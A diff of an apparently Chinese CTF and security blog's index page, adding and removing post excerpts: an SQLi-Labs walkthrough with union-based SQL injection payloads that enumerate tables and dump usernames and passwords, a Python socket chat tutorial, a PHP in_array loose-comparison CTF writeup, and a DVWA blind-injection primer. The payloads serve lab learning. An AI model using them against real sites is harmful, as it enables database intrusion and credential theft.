@@ -138,6 +138,102 @@
     
     
       <div class="col-12 col-md-4 m-auto">
+        <a href="/2019/07/26/SQLi-Labs通关笔记/" target="_self">
+          <img src="https://s2.ax1x.com/2020/03/11/8AZf1J.jpg" srcset="/img/loading.gif" alt="SQLi-Labs通关笔记" class="img-fluid rounded z-depth-3 index-thumbnails">
+        </a>
+      </div>
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2019/07/26/SQLi-Labs通关笔记/">
+        <p class="h4 index-header">SQLi-Labs通关笔记</p>
+        
+        
+          
+        
+        <div class="index-excerpt">
+          <div class="index-text mb-1">Less-1?id=1&#39; 单引号报错，存在注入
+?id=1&#39; order by 4 %23&#39;报错，存在三列
+?id=-1&#39; union select 1,2,3%23 发现2和3的位置可以回显，于是进行注入
+?id=-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 %23得到当前库下所有表名
+?id=-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),3%23得到users表下的所有列名
+?id=-1&#39; union select 1,(select group_concat(username) from users),(select group_concat(passw</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-07-26&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/CTF">CTF</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/CTF">CTF</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+      <div class="col-12 col-md-4 m-auto">
+        <a href="/2019/07/19/Python多线程socket模拟C-S多人聊天室/" target="_self">
+          <img src="https://s2.ax1x.com/2020/03/11/8kt3M6.png" srcset="/img/loading.gif" alt="Python多线程socket模拟C/S多人聊天室" class="img-fluid rounded z-depth-3 index-thumbnails">
+        </a>
+      </div>
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2019/07/19/Python多线程socket模拟C-S多人聊天室/">
+        <p class="h4 index-header">Python多线程socket模拟C/S多人聊天室</p>
+        
+        
+          
+        
+        <div class="index-excerpt">
+          <div class="index-text mb-1">0x01 分析1. 原理（1）在服务端，由于 socket 的 recv() 方法在成功读取到数据之前，线程会被阻塞，程序无法继续执行，因此需要为每个 socket 单独启动一个线程，每个线程负责与一个客户端进行通信。
+（2）在客户端，从服务段读取数据的线程同样也会被阻塞，因此也需要单独启动一个线程，专门负责从服务端读取数据。
+2. 实现（1）服务端
+包含多个线程，每个socket对用一个线程，负责从socket中读取数据，打印出来并广播给所有建立通信的客户端，因此需要一个 socket_list 来保存所有建立连接的客户端。
+read_client() 函数用来不断读取客户端发送的数据，同时捕获异常。
+server_target() 函数作为线程的执行体，采用循环不断地从socket中读取客户端发送过来的数据，然后遍历 socket_list 向每个客户端进行广播。
+主线程则负责建立通信，同时每当与一个客户端建立通信，就将其加入到 socket_list 中，并启动一个线程为其服务。
+
+（2）客户端
+每个客户端需要两个线程，子线程的执行体read_server() 函数负责不断的读取</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-07-19&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/Python">Python</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/Python">Python</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+      <div class="col-12 col-md-4 m-auto">
         <a href="/2019/07/19/Python实现多线程下载脚本/" target="_self">
           <img src="https://s2.ax1x.com/2020/03/11/8kthzq.png" srcset="/img/loading.gif" alt="Python实现多线程下载脚本" class="img-fluid rounded z-depth-3 index-thumbnails">
         </a>
@@ -585,114 +681,6 @@ web3查看源代码发现一串Unicode编码，在线解码网站解码即得fla
           <i class="iconfont icon-tag"></i>
           
             <a href="/tags/Writeup">Writeup</a>&nbsp;
-          
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-      <div class="col-12 col-md-4 m-auto">
-        <a href="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/" target="_self">
-          <img src="https://s2.ax1x.com/2020/03/11/8kYrE4.png" srcset="/img/loading.gif" alt="CumtCTF2019Ⅱ——Writeup（Web详解）" class="img-fluid rounded z-depth-3 index-thumbnails">
-        </a>
-      </div>
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/">
-        <p class="h4 index-header">CumtCTF2019Ⅱ——Writeup（Web详解）</p>
-        
-        
-          
-        
-        <div class="index-excerpt">
-          <div class="index-text mb-1">Web1：签到题1、打开题目，源码直接显示在网页上。
-2、发现构造0ver、0ver1、0ver2即可，下面就进行代码审计：
-（1）首先构造 0ver，有以下三个条件：① ereg(&quot;^[0-9]+$&quot;, $a) === FALSE)，即要进行一次或多次 0-9 数字正则表达式匹配② in_array($a,$white_list)，即0ver 中要有 range（0，9）③ strlen($a)&gt;1，即0ver 的长度要大于 1
-一开始以为要考ereg()截断漏洞，其实是in_array()松散比较，即
-var_dump(in_array(&#39;b&#39;, array(&#39;a&#39;=&gt;true))); 
-返回值:true
-
-var_dump(in_array(&#39;01&#39;,array(&#39;1&#39;)));
-返回值也是:true
-
-为什么是这样呢？
-
-in_array(&#39;b&#39;, array(&#39;a&#39;=&gt;true))  实质上是&#39;b&#39;==true 这样的类型比较，b</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2019-03-03&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/Writeup">Writeup</a>&nbsp;
-          &nbsp;
-        
-        
-          <i class="iconfont icon-tag"></i>
-          
-            <a href="/tags/Writeup">Writeup</a>&nbsp;
-          
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-      <div class="col-12 col-md-4 m-auto">
-        <a href="/2019/03/02/以dvwa为例学习简单sql布尔盲注的详细脚本/" target="_self">
-          <img src="https://s2.ax1x.com/2020/03/11/8kJT10.png" srcset="/img/loading.gif" alt="以dvwa为例学习简单sql布尔盲注的详细脚本" class="img-fluid rounded z-depth-3 index-thumbnails">
-        </a>
-      </div>
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2019/03/02/以dvwa为例学习简单sql布尔盲注的详细脚本/">
-        <p class="h4 index-header">以dvwa为例学习简单sql布尔盲注的详细脚本</p>
-        
-        
-          
-        
-        <div class="index-excerpt">
-          <div class="index-text mb-1">0x01 前置知识
-1.SQL注入与SQL盲注SQL注入：
-
-执行SQL注入攻击时，服务器会响应来自数据库服务器的错误信息，信息提示SQL语法不正确等
-一般在页面上直接就会显示执行sql语句的结果
-
-SQL盲注：
-
-一般情况，执行SQL盲注，服务器不会直接返回具体的数据库错误or语法错误，而是会返回程序开发所设置的特定信息（也有特例，如基于报错的盲注）
-一般在页面上不会直接显示sql执行的结果
-有可能出现不确定sql是否执行的情况
-
-
-2.SQL盲注分类根据页面不同的响应方式，SQL盲注分为：基于布尔的盲注、基于时间的盲注、基于报错的盲注
-（1）对于基于布尔的盲注，可通过构造真or假判断条件（数据库各项信息取值的大小比较，如：字段长度、版本数值、字段名、字段名各组成部分在不同位置对应的字符ASCII码…），将构造的sql语句提交到服务器，然后根据服务器对不同的请求返回不同的页面结果（True、False）；然后不断调整判断条件中的数值以逼近真实值，特别是需要关注响应从TrueFalse发生变化的转折点。（2）对于基于时间的盲注，通过构造真or假判断条件的sql语句，且sql语句中根据需</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2019-03-02&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/CTF">CTF</a>&nbsp;
-          &nbsp;
-        
-        
-          <i class="iconfont icon-tag"></i>
-          
-            <a href="/tags/CTF">CTF</a>&nbsp;
           
         
       </div>
